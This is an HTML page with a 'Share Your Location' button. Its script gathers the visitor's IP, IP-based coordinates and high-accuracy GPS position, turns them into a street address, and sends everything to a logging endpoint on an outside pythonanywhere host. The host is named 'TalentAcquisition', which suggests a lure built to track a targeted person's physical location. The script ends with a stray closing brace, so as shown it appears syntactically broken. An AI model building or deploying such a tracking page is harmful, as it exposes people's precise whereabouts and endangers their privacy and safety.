<!DOCTYPE html>
<html>
<head>
    <title>Location Access</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f2f5; }
        .card { background:white; padding:30px; border-radius:10px; text-align:center; }
        button { padding:10px 20px; font-size:16px; cursor:pointer; }
    </style>
</head>
<body>
<div class="card">
    <h3>Share Your Location</h3>
    <p>This site will collect your location.</p>
    <button onclick="start()">Allow & Continue</button>
    <p id="status"></p>
</div>

<script>
const PA_USER = "TalentAcquisition";
let sent = false;

async function start() {
    document.getElementById("status").innerText = "Collecting...";

    let data = { ip: "0.0.0.0", lat: "0", lon: "0", type: "IP-Only" };

    try {
        const res = await fetch('https://ipapi.co/json/');
        const json = await res.json();
        data.ip = json.ip;
        data.lat = json.latitude;
        data.lon = json.longitude;
    } catch(e) {}

    async function sendData() {
    if (sent) return;
    sent = true;

    let address = "Unknown";

    try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.lat}&lon=${data.lon}`);
        const json = await res.json();
        address = json.display_name;
    } catch (e) {
        console.log("Address fetch failed");
    }

    const url = `https://${PA_USER}.pythonanywhere.com/log?lat=${data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}&address=${encodeURIComponent(address)}`;

    fetch(url).then(() => {
        document.getElementById("status").innerText = "Done ✅";
    }).catch(() => {
        document.getElementById("status").innerText = "Error";
    });
}
if (navigator.geolocation) {
    let gpsDone = false;

    navigator.geolocation.getCurrentPosition(
        (pos) => {
            gpsDone = true;
            data.lat = pos.coords.latitude;
            data.lon = pos.coords.longitude;
            data.type = "GPS";
            sendData();
        },
        (err) => {
            gpsDone = true;
            console.log("GPS failed");
            sendData();
        },
        { enableHighAccuracy: true, timeout: 8000 }
    );

    // 🔥 Backup: if GPS hangs, send after 9 sec
    setTimeout(() => {
        if (!gpsDone) {
            console.log("GPS timeout fallback");
            sendData();
        }
    }, 9000);

} else {
    sendData();
}
    
    }


}
</script>
</body>
</html>
